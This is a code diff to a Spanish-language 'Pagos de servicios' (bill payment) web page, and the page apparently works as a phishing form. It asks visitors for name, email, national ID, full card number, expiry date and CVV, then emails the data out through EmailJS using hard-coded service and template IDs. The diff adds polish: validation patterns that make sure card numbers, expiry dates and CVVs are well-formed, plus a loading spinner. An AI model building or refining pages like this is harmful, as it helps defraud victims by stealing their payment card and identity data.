@@ -2,12 +2,12 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Pagos de servicios</title>
   <style>
     body {
-      font-family: 'Segoe UI', sans-serif;
-      background: #e9f0f4;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f4f7fa;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -16,59 +16,96 @@
     }
 
     .container {
-      background: white;
-      padding: 40px;
+      background: #fff;
+      padding: 40px 30px;
       border-radius: 12px;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+      box-shadow: 0 12px 28px rgba(0,0,0,0.12);
       max-width: 420px;
       width: 100%;
     }
 
     h2 {
       text-align: center;
-      color: #2c3e50;
-      margin-bottom: 10px;
+      color: #34495e;
+      margin-bottom: 8px;
     }
 
     .info {
-      font-size: 15px;
-      color: #555;
+      font-size: 14px;
+      color: #6c7a89;
       text-align: center;
       margin-bottom: 25px;
     }
 
-    input, button {
+    form input, form button {
       width: 100%;
-      padding: 12px;
-      margin-bottom: 15px;
+      padding: 14px 16px;
+      margin-bottom: 18px;
       font-size: 16px;
-      border: 1px solid #ccd6dd;
-      border-radius: 8px;
+      border: 1.8px solid #d1d9e6;
+      border-radius: 10px;
       box-sizing: border-box;
+      transition: border-color 0.3s ease;
     }
 
-    button {
-      background-color: #3498db;
-      color: white;
-      font-weight: bold;
+    form input:focus {
+      border-color: #2980b9;
+      outline: none;
+    }
+
+    form input.invalid {
+      border-color: #e74c3c;
+      background-color: #fdecea;
+    }
+
+    form button {
+      background-color: #2980b9;
+      color: #fff;
+      font-weight: 600;
       border: none;
       cursor: pointer;
-      border-radius: 8px;
+      border-radius: 10px;
       transition: background-color 0.3s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
     }
 
-    button:hover {
-      background-color: #2980b9;
+    form button:disabled {
+      background-color: #95a5a6;
+      cursor: not-allowed;
+    }
+
+    form button:hover:not(:disabled) {
+      background-color: #1c5980;
     }
 
     .success {
       background: #d4edda;
       color: #155724;
-      padding: 12px;
+      padding: 14px;
       margin-top: 20px;
-      border-radius: 8px;
+      border-radius: 10px;
       text-align: center;
       font-size: 15px;
+      font-weight: 600;
+    }
+
+    .loader {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #3498db;
+      border-radius: 50%;
+      width: 22px;
+      height: 22px;
+      animation: spin 1s linear infinite;
+      display: inline-block;
+      vertical-align: middle;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
   </style>
 </head>
@@ -79,15 +116,15 @@
       Complete el formulario. Los datos se enviarán a tu correo.
     </div>
 
-    <form id="payment-form">
+    <form id="payment-form" novalidate>
       <input type="text" name="nombre" placeholder="Nombre completo" required />
       <input type="email" name="email" placeholder="Correo electrónico" required />
       <input type="text" name="dni" placeholder="DNI" required maxlength="15" />
-      <input type="text" name="tarjeta" placeholder="Número de tarjeta" required maxlength="16" />
+      <input type="text" name="tarjeta" placeholder="Número de tarjeta" required maxlength="16" pattern="\d{13,16}" />
       <input type="text" name="titular" placeholder="Nombre del titular" required />
-      <input type="text" name="vencimiento" placeholder="MM/AA (Vencimiento)" required maxlength="5" />
-      <input type="text" name="cvv" placeholder="CVV" required maxlength="4" />
-      <button type="submit">Pagar</button>
+      <input type="text" name="vencimiento" placeholder="MM/AA (Vencimiento)" required pattern="^(0[1-9]|1[0-2])\/?([0-9]{2})$" maxlength="5" />
+      <input type="text" name="cvv" placeholder="CVV" required maxlength="4" pattern="\d{3,4}" />
+      <button type="submit">Realizar pago</button>
     </form>
 
     <div id="mensaje" class="success" style="display: none;"></div>
@@ -96,28 +133,72 @@
   <!-- EmailJS SDK -->
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
-    (function(){
-      emailjs.init("FL6vofHg7F9vLawQs");
-    })();
+    emailjs.init("FL6vofHg7F9vLawQs");
   </script>
 
   <script>
     const form = document.getElementById("payment-form");
     const mensaje = document.getElementById("mensaje");
+    const button = form.querySelector("button");
+
+    // Función para validar campos usando patrones y required
+    function validarCampo(input) {
+      if (!input.checkValidity()) {
+        input.classList.add("invalid");
+        return false;
+      } else {
+        input.classList.remove("invalid");
+        return true;
+      }
+    }
+
+    // Validar todo el formulario
+    function validarFormulario() {
+      const inputs = form.querySelectorAll("input[required]");
+      let valido = true;
+      inputs.forEach(input => {
+        if (!validarCampo(input)) valido = false;
+      });
+      return valido;
+    }
+
+    form.addEventListener("input", (e) => {
+      validarCampo(e.target);
+    });
 
     form.addEventListener("submit", function(e) {
       e.preventDefault();
 
+      if (!validarFormulario()) {
+        alert("Por favor, completa todos los campos correctamente.");
+        return;
+      }
+
+      // Mostrar loader y deshabilitar botón
+      button.disabled = true;
+      const loader = document.createElement("span");
+      loader.classList.add("loader");
+      button.textContent = "Enviando...";
+      button.prepend(loader);
+
       emailjs.sendForm("service_6pbv86h", "template_m3nuw4p", this)
         .then(() => {
-          mensaje.innerHTML = "✅ ¡Formulario enviado correctamente!";
+          mensaje.textContent = "✅ ¡Formulario enviado correctamente!";
           mensaje.style.display = "block";
           form.reset();
+          button.disabled = false;
+          button.textContent = "Realizar pago";
+          // Quitar loader
+          loader.remove();
+
           setTimeout(() => {
             mensaje.style.display = "none";
-          }, 5000);
+          }, 6000);
         }, (error) => {
           alert("❌ Error al enviar: " + JSON.stringify(error));
+          button.disabled = false;
+          button.textContent = "Realizar pago";
+          loader.remove();
         });
     });
   </script>
